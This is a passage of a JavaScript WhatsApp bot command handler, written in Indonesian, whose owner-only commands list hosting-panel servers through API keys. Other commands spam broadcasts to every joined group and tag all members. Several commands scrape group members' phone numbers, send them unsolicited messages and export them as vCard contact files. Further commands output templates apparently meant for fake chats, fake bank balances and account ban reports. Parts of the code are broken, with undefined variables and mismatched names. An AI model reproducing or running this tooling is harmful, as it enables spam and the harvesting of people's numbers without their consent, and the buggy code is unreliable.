  if (!isOwner && !isPremium) return reply(`Maaf, Anda tidak dapat melihat daftar server.`);
  let page = args[0] ? args[0] : '1';
  let f = await fetch(domain + "/api/application/servers?page=" + page, {
    "method": "GET",
    "headers": {
      "Accept": "application/json",
      "Content-Type": "application/json",
      "Authorization": "Bearer " + apikeyy
    }
  });
  let res = await f.json();
  let servers = res.data;
  let sections = [];
  let messageText = "Berikut adalah daftar server:\n\n";
  
  for (let server of servers) {
    let s = server.attributes;
    
    let f3 = await fetch(domain + "/api/client/servers/" + s.uuid.split`-`[0] + "/resources", {
      "method": "GET",
      "headers": {
        "Accept": "application/json",
        "Content-Type": "application/json",
        "Authorization": "Bearer " + capikeyy
      }
    });
    
    let data = await f3.json();
    let status = data.attributes ? data.attributes.current_state : s.status;
    
    messageText += `ID Server: ${s.id}\n`;
    messageText += `Nama Server: ${s.name}\n`;
    messageText += `Status: ${status}\n\n`;
  }
  
  messageText += `Halaman: ${res.meta.pagination.current_page}/${res.meta.pagination.total_pages}\n`;
  messageText += `Total Server: ${res.meta.pagination.count}`;
  
  await Biiofc.sendMessage(m.chat, { text: messageText }, { quoted: m });
  
  if (res.meta.pagination.current_page < res.meta.pagination.total_pages) {
    reply(`Gunakan perintah ${prefix}listsrv1 ${res.meta.pagination.current_page + 1} untuk melihat halaman selanjutnya.`);
  }
}
break;    
case 'mediafire': {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply(`Ngapain ? Fitur Ini Khusus Tuan Saya😜`)
	if (args.length == 0) return reply(`Link Nya Tuan?`)
	if (!isUrl(args[0]) && !args[0].includes('mediafire.com')) return reply(`The link you provided is invalid`)
	const { mediafireDl } = require('./freya/mediafire.js')
	const baby1 = await mediafireDl(text)
	if (baby1[0].size.split('MB')[0] >= 100) return reply('Oops, the file is too big...')
	const result4 = `*MEDIAFIRE DOWNLOADER*

*❖ Name* : ${baby1[0].nama}
*❖ Size* : ${baby1[0].size}
*❖ Mime* : ${baby1[0].mime}
*❖ Link* : ${baby1[0].link}`
reply(`${result4}`)
Biiofc.sendMessage(m.chat, { document : { url : baby1[0].link}, fileName : baby1[0].nama, mimetype: baby1[0].mime }, { quoted : m })
}
break
  case "jpm":{
if (!isOwner) return reply(`Khusus Hz Offcial Aja`)
if (!text) return reply(`*Penggunaan Salah Silahkan Gunakan Seperti Ini*\n${prefix+command} teks|jeda\n\nReply Gambar Untuk Mengirim Gambar Ke Semua Group\nUntuk Jeda Itu Delay Jadi Nominal Jeda Itu 1000 = 1 detik`)
await reply("_Wait Tuan Ku✅_")
let getGroups = await Biiofc.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map((entry) => entry[1])
let anu = groups.map((v) => v.id)
for (let xnxx of anu) {
let metadat72 = await Biiofc.groupMetadata(xnxx)
let participanh = await metadat72.participants
if (/image/.test(mime)) {
media = await Biiofc.downloadAndSaveMediaMessage(quoted)
mem = await uptotelegra(media)
await Biiofc.sendMessage(xnxx, { image: { url: mem }, caption: text.split('|')[0]})
await sleep(text.split('|')[1])
} else {
await Biiofc.sendMessage(xnxx, { text: text.split('|')[0]})
await sleep(text.split('|')[1])
}}
reply("*SUCCESFUL TUAN HARDZ OFC ✅*")
}
break
case 'bcpoll': {
                if (!isOwner) return m.reply('Khusus Owner')
                if (!text) return m.reply(`Text mana?\n\nExample : ${prefix + command} fatih-san`)
                let getGroups = await Biiofc.groupFetchAllParticipating()
                let groups = Object.entries(getGroups).slice(0).map(entry => entry[1])
                let anu = groups.map(v => v.id)
                m.reply(`Mengirim Broadcast Ke ${anu.length} Group Chat, Waktu Selesai ${anu.length * 1.5} detik`)
                for (let i of anu) {
                    await sleep(1500)
                      let txt = `「 Broadcast Bot 」\n\n${text}`
                      Biiofc.sendPoll(m.chat, anu, ['Owner','ListMenu'])
            }
                m.reply(`Sukses Mengirim Broadcast Ke ${anu.length} Group`)
            }
            break
            
            case 'bc': case 'broadcast': case 'bcall': {
                if (!isCreator) throw mess.owner
                if (!text) throw `Text mana?\n\nExample : ${prefix + command} fatih-san`
                let anu = await store.chats.all().map(v => v.id)
                m.reply(`Mengirim Broadcast Ke ${anu.length} Chat\nWaktu Selesai ${anu.length * 1.5} detik`)
    		for (let yoi of anu) {
    		    await sleep(1500)
    		    hisoka.sendText(yoi, txt)
    		}
    		m.reply('Sukses Broadcast')
            }
            break
case "jpmtag":{
if (!isOwner) return reply(`Khusus Hz Offcial Aja`)
if (!text) return reply(`*Penggunaan Salah Silahkan Gunakan Seperti Ini*\n${prefix+command} teks|jeda\n\nReply Gambar Untuk Mengirim Gambar Ke Semua Group\nUntuk Jeda Itu Delay Jadi Nominal Jeda Itu 1000 = 1 detik`)
await reply("_Wait Tuan Ku✅_")
let getGroups = await Biiofc.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map((entry) => entry[1])
let anu = groups.map((v) => v.id)
for (let xnxx of anu) {
let metadat72 = await Biiofc.groupMetadata(xnxx)
let participanh = await metadat72.participants
if (/image/.test(mime)) {
media = await Biiofc.downloadAndSaveMediaMessage(quoted)
mem = await uptotelegra(media)
await Biiofc.sendMessage(xnxx, { image: { url: mem }, caption: text.split('|')[0], mentions: participanh.map(a => a.id) })
await sleep(text.split('|')[1])
} else {
await Biiofc.sendMessage(xnxx, { text: text.split('|')[0], mentions: participanh.map(a => a.id) })
await sleep(text.split('|')[1])
}}
reply("*SUCCESFUL TUAN HARDZ OFC ✅*")
}
break   
case "pushkontakv1":{
if (!isOwner) return reply(`Khusus Hz Offcial Aja`)
if (isGroup) return reply(mess.only.private)
if (!text) return reply(`Penggunaan Salah Silahkan Gunakan Command Seperti Ini\n${prefix+command} idgroup|tekspushkontak\nUntuk Liat Id Group Silahkan Ketik .cekidgc`)
reply(mess.wait)
const groupMetadataa = !isGroup? await Biiofc.groupMetadata(`${text.split("|")[0]}`).catch(e => {}) : ""
const participants = !isGroup? await groupMetadataa.participants : ""
const halls = await participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
global.tekspushkon = text.split("|")[1]
if (isContacts) return
for (let mem of halls) {
if (isContacts) return
contacts.push(mem)
fs.writeFileSync('./all/database/contacts.json', JSON.stringify(contacts))
if (/image/.test(mime)) {
media = await Biiofc.downloadAndSaveMediaMessage(quoted)
memk = await uptotelegra(media)
await Biiofc.sendMessage(mem, { image: { url: memk }, caption: global.tekspushkon })
await sleep(1000)
} else {
await Biiofc.sendMessage(mem, { text: global.tekspushkon })
await sleep(1000)
}
}
try {
const uniqueContacts = [...new Set(contacts)];
const vcardContent = uniqueContacts.map((contact, index) => {
const vcard = [
"BEGIN:VCARD",
"VERSION:3.0",
`FN:WA[${createSerial(1)}] ${contact.split("@")[0]}`,
`TEL;type=CELL;type=VOICE;waid=${contact.split("@")[0]}:+${contact.split("@")[0]}`,
"END:VCARD",
"", ].join("\n");
return vcard; }).join("");
fs.writeFileSync("./all/database/contacts.vcf", vcardContent, "utf8");
} catch (err) {
reply(util.format(err))
} finally {
await Biiofc.sendMessage(from, { document: fs.readFileSync("./all/database/contacts.vcf"), fileName: "contacts.vcf", caption: "Nih Kak Tinggal Pencet File Di Atas Terus Save", mimetype: "text/vcard", }, { quoted: m })
contacts.splice(0, contacts.length)
fs.writeFileSync("./all/database/contacts.json", JSON.stringify(contacts))
}
}
break
case "pushkontakv2":{
if (!isOwner) return reply(`Khusus Hzo Offcial Aja`)
if (!isGroup) return reply(mess.only.group)
if (!text) return reply(`Penggunaan Salah Silahkan Gunakan Command Seperti Ini\n${prefix+command} teks`)
reply(mess.wait)
const groupMetadata = isGroup? await Biiofc.groupMetadata(from).catch(e => {}) : ""
const groupOwner = isGroup? groupMetadata.owner : ""
const participantts = isGroup? await groupMetadata.participants : ""
const halsss = await participantts.filter(v => v.id.endsWith('.net')).map(v => v.id)
global.tekspushkonv2 = text
if (isContacts) return
for (let men of halsss) {
contacts.push(men)
fs.writeFileSync('./all/database/contacts.json', JSON.stringify(contacts))
if (/image/.test(mime)) {
media = await Biiofc.downloadAndSaveMediaMessage(quoted)
mem = await uptotelegra(media)
await Biiofc.sendMessage(men, { image: { url: mem }, caption: global.tekspushkonv2 })
await sleep(1000)
} else {
await Biiofc.sendMessage(men, { text: global.tekspushkonv2 })
await sleep(1000)
}
}
reply("File Kontak Sudah Di Kirim Lewat Chat Pribadi")
try {
const uniqueContacts = [...new Set(contacts)];
const vcardContent = uniqueContacts.map((contact, index) => {
const vcard = [
"BEGIN:VCARD",
"VERSION:3.0",
`FN:WA[${createSerial(1)}] ${contact.split("@")[0]}`,
`TEL;type=CELL;type=VOICE;waid=${contact.split("@")[0]}:+${contact.split("@")[0]}`,
"END:VCARD",
"", ].join("\n");
return vcard; }).join("");
fs.writeFileSync("./all/database/contacts.vcf", vcardContent, "utf8");
} catch (err) {
reply(util.format(err))
} finally {
await Biiofc.sendMessage(sender, { document: fs.readFileSync("./all/database/contacts.vcf"), fileName: "contacts.vcf", caption: "Nih Kak Tinggal Pencet File Di Atas Terus Save", mimetype: "text/vcard", }, { quoted: m })
contacts.splice(0, contacts.length)
fs.writeFileSync("./all/database/contacts.json", JSON.stringify(contacts))
}
}
break
case 'ss': case 'ssweb': {
if (!q) return reply(`Example ${prefix+command} link`)
reply(mess.wait)
let krt = await scp1.ssweb(q)
Biiofc.sendMessage(from,{image:krt.result,caption:mess.succes}, {quoted:m})
}
break
case "pushkontakv3":
if (!isOwner) return reply(`Khusus Hz Offcial Aja`)
if (!text) return reply(`Penggunaan Salah Silahkan Gunakan Command Seperti Ini\n${prefix+command} idgroup|jeda|teks\nUntuk Liat Id Group Silahkan Ketik .idgroup`)
await reply("Otw Boskuuu")
const groupMetadataa = !isGroup? await Biiofc.groupMetadata(`${q.split("|")[0]}`).catch(e => {}) : ""
const participantss = !isGroup? await groupMetadataa.participants : ""
const halls = await participantss.filter(v => v.id.endsWith('.net')).map(v => v.id)
global.tekspushkonv3 = q.split("|")[2]
for (let mem of halls) {
if (/image/.test(mime)) {
media = await Biiofc.downloadAndSaveMediaMessage(quoted)
memk = await uptotelegra(media)
await Biiofc.sendMessage(men, { image: { url: mem }, caption: global.tekspushkonv3 })
await sleep(q.split("|")[1])
} else {
await Biiofc.sendMessage(mem, { text: global.tekspushkonv3 })
await sleep(q.split("|")[1])
}
}
reply("Succes Boss!")
break
case "pushkontakv4":
if (!isOwner) return reply(`Khusus Hzo Offcial Aja`)
if (isGroup) return reply(mess.only.private)
if (!text) return reply(`Penggunaan Salah Silahkan Gunakan Command Seperti Ini\n${prefix+command} jeda|teks`)
await reply("Otw Boskuuu")
const halsss = await participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
global.tekspushkonv4 = text.split("|")[1]
for (let men of halsss) {
if (/image/.test(mime)) {
media = await Biiofc.downloadAndSaveMediaMessage(quoted)
mem = await uptotelegra(media)
await Biiofc.sendMessage(men, { image: { url: mem }, caption: global.tekspushkonv4 })
await sleep(text.split("|")[0])
} else {
await Biiofc.sendMessage(men, { text: global.tekspushkonv4 })
await sleep(text.split("|")[0])
}
}
reply("Succes Boss!")
break
case "savecontactv1": {
if (!isOwner) return reply(`Khusus Hz Offcial Aja`)
if (!text) return reply(`Maaf Kak Fitur ${prefix+command} Hanya Bisa Di Gunakan Di Dalam Group\nUntuk Memasukan Bot Ke Dalam Group Yang Di Ingin Kan\nSilahkan Ketik Command .join linkgroup`)
await reply("_Wᴀɪᴛɪɴɢ ɪɴ ᴘʀᴏɢʀᴇss !!_")
const groupMetadata = isGroup? await Biiofc.groupMetadata(from).catch(e => {}) : ""
const groupOwner = isGroup? groupMetadata.owner : ""
const participantts = isGroup? await groupMetadata.participants : ""
const halsss = await participantts.filter(v => v.id.endsWith('.net')).map(v => v.id)
for (let men of halsss) {
if (isContacts) return
contacts.push(men)
fs.writeFileSync('./all/database/contacts.json', JSON.stringify(contacts))
}
reply("Sukses File Sudah Di Kirim Lewat Chat Private")
try {
const uniqueContacts = [...new Set(contacts)];
const vcardContent = uniqueContacts.map((contact, index) => {
const vcard = [
"BEGIN:VCARD",
"VERSION:3.0",
`FN:WA[${createSerial(2)}] ${contact.split("@")[0]}`,
`TEL;type=CELL;type=VOICE;waid=${contact.split("@")[0]}:+${contact.split("@")[0]}`,
"END:VCARD",
"", ].join("\n");
return vcard; }).join("");
fs.writeFileSync("./data/database/contacts.vcf", vcardContent, "utf8");
} catch (err) {
reply(util.format(err))
} finally {
await Biiofc.sendMessage(sender, { document: fs.readFileSync("./all/database/contacts.vcf"), fileName: "contacts.vcf", caption: "Sukses Tinggal Save Ya Kakak", mimetype: "text/vcard", }, { quoted: m })
contacts.splice(0, contacts.length)
fs.writeFileSync("./all/database/contacts.json", JSON.stringify(contacts))
}
}
break
case 'google': {
 if (!text) throw `Example : ${prefix + command} fatih arridho`
let google = require('google-it')
google({'query': text}).then(res => {
let teks = `Google Search From : ${text}\n\n`
for (let g of res) {
teks += `⭔ *Title* : ${g.title}\n`
teks += `⭔ *Description* : ${g.snippet}\n`
teks += `⭔ *Link* : ${g.link}\n\n────────────────────────\n\n`
} 
m.reply(teks)
})
}
break        
case 'getcontact': case 'getkontak':
if (!isOwner) return reply(`Khusus Hardz Offcial Aja`)
if (!isGroup) return m.reply(`Khusus Group Kontol`)
huhuhs = await Biiofc.sendMessage(m.chat, {
    text: `Grup; *${groupMetadata.subject}*\nTotal peserta; *${participants.length}*`
}, {quoted: m, ephemeralExpiration: 86400})
await sleep(1000) // (?); mengirim kontak seluruh member
Biiofc.sendContact(m.chat, participants.map(a => a.id), huhuhs)
break
case 'savekontak': case 'svkontak':
if (!isOwner) return reply(`Khusus Hzo Offcial Aja`)
if (!isGroup) return m.reply(`Khusus Group Kontol`)
let cmiggc = await Biiofc.groupMetadata(m.chat)
let orgiggc = participants.map(a => a.id)
vcard = ''
noPort = 0
for (let a of cmiggc.participants) {
    vcard += `BEGIN:VCARD\nVERSION:3.0\nFN:[${noPort++}] +${a.id.split("@")[0]}\nTEL;type=CELL;type=VOICE;waid=${a.id.split("@")[0]}:+${a.id.split("@")[0]}\nEND:VCARD\n`
} // (?); mengimpor kontak seluruh member - save
let nmfilect = './contacts.vcf'
reply('*Mengimpor '+cmiggc.participants.length+' kontak..*')
fs.writeFileSync(nmfilect, vcard.trim())
await sleep(2000)
Biiofc.sendMessage(m.chat, {
    document: fs.readFileSync(nmfilect), mimetype: 'text/vcard', fileName: 'Contact.vcf', caption: 'GROUP: *'+cmiggc.subject+'*\nMEMBER: *'+cmiggc.participants.length+'*'
}, {ephemeralExpiration: 86400, quoted: m})
fs.unlinkSync(nmfilect)
break
case 'sendkontak': case 'kontak':
if (!isOwner) return reply(`Khusus Hardz Offcial Aja`)
if (!isGroup) return m.reply(`Khusus Group`)
if (!m.mentionedJid[0]) return reply('Ex; .kontak @tag|nama')
let snTak = text.split(' ')[1] ? text.split(' ')[1] : 'Contact'
let snContact = {
	displayName: "Contact", contacts: [{displayName: snTak, vcard: "BEGIN:VCARD\nVERSION:3.0\nN:;"+snTak+";;;\nFN:"+snTak+"\nitem1.TEL;waid="+m.mentionedJid[0].split('@')[0]+":"+m.mentionedJid[0].split('@')[0]+"\nitem1.X-ABLabel:Ponsel\nEND:VCARD"}]
} // (?); send kontak
Biiofc.sendMessage(m.chat, {contacts: snContact}, {ephemeralExpiration: 86400})
break
case "savecontactv2": {
if (!isOwner) return reply(`Khusus Hzo Offcial Aja`)
if (isGroup) return reply(mess.only.private)
if (!text) return reply(`Penggunaan Salah Silahkan Gunakan Command Seperti Ini\n${prefix+command} idgroup\nUntuk Liat Id Group Silahkan Ketik .cekidgc`)
await reply("_Wᴀɪᴛɪɴɢ ɪɴ ᴘʀᴏɢʀᴇss !!_")
const groupMetadataa = !isGroup? await Biiofc.groupMetadata(`${text}`).catch(e => {}) : ""
const participants = !isGroup? await groupMetadataa.participants : ""
const halls = await participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
for (let mem of halls) {
if (isContacts) return
contacts.push(mem)
fs.writeFileSync('./all/database/contacts.json', JSON.stringify(contacts))
}
try {
const uniqueContacts = [...new Set(contacts)];
const vcardContent = uniqueContacts.map((contact, index) => {
const vcard = [
"BEGIN:VCARD",
"VERSION:3.0",
`FN:WA[${createSerial(2)}] ${contact.split("@")[0]}`,
`TEL;type=CELL;type=VOICE;waid=${contact.split("@")[0]}:+${contact.split("@")[0]}`,
"END:VCARD",
"", ].join("\n");
return vcard; }).join("");
fs.writeFileSync("./all/database/contacts.vcf", vcardContent, "utf8");
} catch (err) {
reply(util.format(err))
} finally {
await Biiofc.sendMessage(from, { document: fs.readFileSync("./data/database/contacts.vcf"), fileName: "contacts.vcf", caption: "Sukses Tinggal Save Ya Kakak", mimetype: "text/vcard", }, { quoted: m })
contacts.splice(0, contacts.length)
fs.writeFileSync("./data/database/contacts.json", JSON.stringify(contacts))
}
}
break
case 'bcvideo': case 'broadcastimage': case 'bcimage': case 'broadcastvideo': case 'broadcastvid':
if (!isOwner) return reply(`Khusus Hz Offcial Aja`)
        if (!q) return reply(`*Enter Text*`)
        let getGroups = await Biiofc.groupFetchAllParticipating()
        let groups = Object.entries(getGroups).slice(0).map(entry => entry[1])
        let xeoncast = groups.map(v => v.id)
        reply(`\`\`\`Broadcasting in\`\`\` *${xeoncast.length}* \`\`\`Group Chat, in\`\`\` *${xeoncast.length * 1.5} seconds*`)
        for (let i of xeoncast) {
let txt = `*${global.ownerName}'s Broadcast*\n\n\`\`\`Message :\`\`\` *${q}*`
if(/image/.test(mime)) {
let media = await quoted.download()
await Biiofc.sendMessage(i, { image:media,  caption: txt,mentions:participants.map(a => a.id) })
}
if(/video/.test(mime)){
let media = await quoted.download()
await Biiofc.sendMessage(i, { video:media,  caption: txt, mentions:participants.map(a => a.id) })
}
            }
        reply(`\`\`\`Successfuly Broadcasted in\`\`\` *${xeoncast.length} Groups*`)      
        break        
case 'alltotal':
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
const total = `
${totalban()}

${totalunban()}

${totalfakechat()}

Powered By *${namaCreator}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`
reply(total)
break
case 'tools1':
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
const ttls1 = ` ${tools1()}



Powered By *${namaCreator}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`
reply(ttls1)
break
case 'tools2':
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
const ttls2 = ` ${tools2()}



Powered By *${namaCreator}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`
reply(ttls2)
break
case 'cek-saldobri':
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
const saldooo = ` ${saldoo()}



Powered By *${namaCreator}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`
reply(saldooo)
break
case 'fakecn1':
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
const fakecnn = ` ${fakecn1()}



Powered By *${namaCreator}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`
reply(fakec)
break
case 'fakecn2':
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
const fakecn = ` ${fakecn2()}



Powered By *${namaCreator}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`
reply(fakec)
break
case 'fakec1':
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
const fakec = ` ${fakec1()}



Powered By *${namaCreator}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`
reply(fakec)
break
//============================================//
case 'fakec2':
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
const tek = ` ${fakec2()}


Powered By *${namaCreator}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`
reply(tek)
break
//============================================//
case 'fakec3':
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
const hade = ` ${fakec3()}


Powered By *${namaCreator}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`
reply(hade)
break
//============================================//
case 'fakec4':
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
const wtf = ` ${fakec4()}


Powered By *${namaCreator}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`
reply(wtf)
break
//=======================================================//
//============================================//
case 'fakec5':
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
const mmk = ` ${fakec5()}


Powered By *${namaCreator}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`
reply(mmk)
break
//=======================================================//

//============================================//
case 'fakec6':
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
const jan = ` ${fakec6()}



Powered By *${namaCreator}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`
reply(jan)
break
case 'fakec7':{
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
const lullu = ` ${fakec7()}


Powered By *${namaCreator}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`
reply(lullu)
}
break
case 'fakec8':{
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
const alfi = ` ${fakec8()}


Powered By *${namaCreator}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`
reply(alfi)
}
break
case 'fakec9':{
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
const amalia = ` ${fakec9()}


Powered By *${namaCreator}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`
reply(amalia)
}
break
case 'fakec10':{
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
const ayg = ` ${fakec10()}


Powered By *${namaCreator}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`
reply(ayg)
}
break
case 'fakec11':{
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
const bubub = ` ${fakec11()}


Powered By *${namaCreator}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`
reply(bubub)
}
break
case 'textunbanpremv1':
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
const naga = ` ${textunbanpremv1()}


Powered By *${namaCreator}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`
reply(naga)
break
case 'textunbanpremv2':
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
const kkkkkk = ` ${textunbanpremv2()}


Powered By *${namaCreator}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`
reply(kkkkkk)
break
case 'textunbanpremv3':
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
const nagasaki = ` ${textunbanpremv3()}


Powered By *${namaCreator}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`
reply(nagasaki)
break
case 'textunbanpremv4':
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
const nagakk = ` ${textunbanpremv4()}


Powered By *${namaCreator}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`
reply(nagakk)
break
case 'textunbanpremv5':
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
const nagapp = ` ${textunbanpremv5()}


Powered By *${namaCreator}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`
reply(nagapp)
break

case 'textunbanv1':
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
const vaga = ` ${textunbanv1()}


Powered By *${namaCreator}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`
reply(vaga)
break
case 'textunbanv2':
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
const aga = ` ${textunbanv2()}


Powered By *${namaCreator}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`
reply(aga)
break
case 'textunbanv3':
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
const nagapppp = ` ${textunbanv3()}


Powered By *${namaCreator}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`
reply(nagapppp)
break
case 'textunbanv4':
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
const woii = ` ${textunbanv5()}


Powered By *${namaCreator}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`
reply(woii)
break
case 'textunbanv5':
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
const sokasim = ` ${textunbanv5()}


Powered By *${namaCreator}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`
reply(sokasim)
break
//=======================================================//
case 'textunbanv6':
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
const akakaka = ` ${textunbanv6()}


Powered By *${namaCreator}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`

reply(akakaka)

break
//=======================================================//
case 'textunbanv7':
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
const kopok = ` ${textunbanv7()}


Powered By *${namaCreator}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`

reply(kopok)

break
//=======================================================//
case 'textunbanv8':
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
const tehyung = ` ${textunbanv8()}


Powered By *${namaCreator}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`

reply(tehyung)

break
//=======================================================//
case 'textunbanv9':
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
const ahhyan = ` ${textunbanv9()}


Powered By *${namaCreator}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`

reply(ahhyan)

break
//=======================================================//
case 'textunbanv10':
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
const yamete = ` ${textunbanv10()}


Powered By *${namaCreator}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`

reply(yamete)

break
//=======================================================//
case 'textunbanv11':
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
const suuu = ` ${textunbanv11()}


Powered By *${namaCreator}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`

reply(suuu)

break
//=======================================================//
case 'textunbanv12':
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
const huuuu = ` ${textunbanv12()}


Powered By *${namaCreator}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`

reply(huuuu)

break
//=======================================================//
case 'textunbanv13':
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
const gaje = ` ${textunbanv13()}


Powered By *${namaCreator}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`

reply(gaje)

break
//=======================================================//
case 'textunbanv14':
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
const well = ` ${textunbanv14()}


Powered By *${namaCreator}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`

reply(well)

break
//=======================================================//
case 'textunbanv15':
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
const lempo = ` ${textunbanv15()}


Powered By *${namaCreator}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`

reply(lempo)

break
//=======================================================//
case 'textunbanv16':
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
const cok = ` ${textunbanv16()}


Powered By *${namaCreator}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`

reply(cok)

break
//=======================================================//
case 'textunbanv17':
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
const sayasuka = ` ${textunbanv17()}


Powered By *${namaCreator}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`

reply(sayasuka)

break
//=======================================================//
case 'textunbanv18':
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
const oooooooo= ` ${textunbanv18()}


Powered By *${namaCreator}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`

reply(oooooooo)

break
//=======================================================//
case 'textunbanv19':
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
const omaaavaaaaaaaa = ` ${textunbanv19()}


Powered By *${namaCreator}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`

reply(omaaavaaaaaaaa)

break
//=======================================================//
case 'textunbanv20':
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
const bykepo = ` ${textunbanv20()}


Powered By *${namaCreator}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`

reply(bykepo)

break
//=======================================================//
case 'textunbanv21':
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
const unbannned = ` ${textunbanv21()}


Powered By *${namaCreator}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`

reply(unbannned)

break
case 'textbanv1':
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
const sploer = ` ${textbanv1()}


Powered By *${namaCreator}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`

reply(sploer)

break
//=======================================================//
case 'textbanv2':
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
const ban = ` ${textbanv2()}


Powered By *${namaCreator}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`

reply(ban)

break
//=======================================================//
case 'textbanv3':
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
const masuk = ` ${textbanv3()}


Powered By *${namaCreator}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`

reply(masuk)

break
//=======================================================//
case 'textbanv4':
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
const banned = ` ${textbanv4()}


Powered By *${namaCreator}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`

reply(banned)

break
//=======================================================//
case 'textbanv5':
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
const car = ` ${textbanv5()}


Powered By *${namaCreator}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`

reply(car)

break
//=======================================================//
case 'textbanv6':
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
const capek = ` ${textbanv6()}


Powered By *${namaCreator}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`

reply(capek)

break
//=======================================================//
case 'textbanv7':
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
const hem = `${textbanv7()}


Powered By *${namaCreator}*
